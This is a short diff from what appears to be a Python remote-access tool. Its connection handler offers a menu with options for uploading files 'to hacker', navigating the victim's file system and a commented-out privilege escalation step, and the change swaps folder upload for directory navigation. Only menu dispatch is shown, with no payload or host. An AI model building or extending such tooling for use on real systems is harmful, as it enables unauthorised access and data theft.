@@ -18,8 +18,10 @@ def handleConnection(my_socket):
         elif user_option == "3":
             print("\t\t[+] Uploading Files to hacker")
             upload_files(my_socket)
+
         elif user_option == "4":
-            print("\t\t[+] Uploading Folders to hacker")
+            print("\t\t[+] Navigate File system")
+            my_socket.change_dir()
         elif user_option == "5":
             print("\t\t[+] Privilage escalation")
             # execute(my_socket)
